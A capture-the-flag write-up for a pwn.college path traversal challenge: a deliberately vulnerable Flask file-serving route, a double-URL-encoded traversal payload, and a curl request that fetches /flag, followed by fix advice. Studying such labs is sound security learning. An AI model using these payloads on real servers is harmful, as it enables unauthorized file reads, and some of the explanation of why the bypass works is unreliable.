# 📄 Path Traversal 1 — pwn.college

**Category:** Web Exploitation
**Technique:** Path Traversal (Double URL Encoding Bypass)
**Difficulty:** Easy–Medium

---

## 📌 Challenge Description:

The application uses Flask to serve files via:

```
/deliverables/<path>
```

Relevant source code:

```python
@app.route("/deliverables", methods=["GET"])
@app.route("/deliverables/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    return open(requested_path).read()
```

The user-controlled `path` parameter is directly concatenated into the file path, potentially allowing for **path traversal** attacks.

---

## 📌 Vulnerability Analysis:

The application constructs file paths as:

```
requested_path = app.root_path + "/files/" + path
```

However, direct traversal attempts like:

```
/deliverables/../../flag
```

result in `404 Not Found`.

Reason:

* Python’s `open()` normalizes the file path automatically.
* Flask/Werkzeug normalize URLs by removing sequences like `../` or redundant slashes.

Therefore, standard traversal fails.

---

## 📌 Exploitation:

To bypass normalization, **double URL encoding** was used:

* `%2e` = `.`
* `%2f` = `/`
* `%25` = `%`

Thus:

* `%252e` decodes to `%2e` (dot) after the first decoding pass, then becomes `.` after the second.
* `%252f` similarly becomes `/`.

**Payload:**

```
/deliverables/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%66%6c%61%67
```

Which resolves to:

```
../../../../flag
```

Final path after double decoding:

```
/flag
```

**The flag was successfully retrieved.**

---

## 📍 Final Exploit Request:

```bash
curl -v 'http://challenge.localhost:80/deliverables/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%66%6c%61%67'
```

---

## 📊 Why This Worked:

* The server concatenates raw user input without proper validation.
* Path normalization only occurs after URL decoding — allowing bypass with double-encoded payloads.
* The Flask framework's protections were bypassed using **double URL encoding**.

---

## 📌 Remediation Recommendations:

* Use `os.path.realpath()` or similar to normalize and validate paths before file access.
* Block sequences like `../` or use allowlisting for file access.
* Never trust direct user input when handling file paths.
* Use dedicated secure file-serving functions in web frameworks.
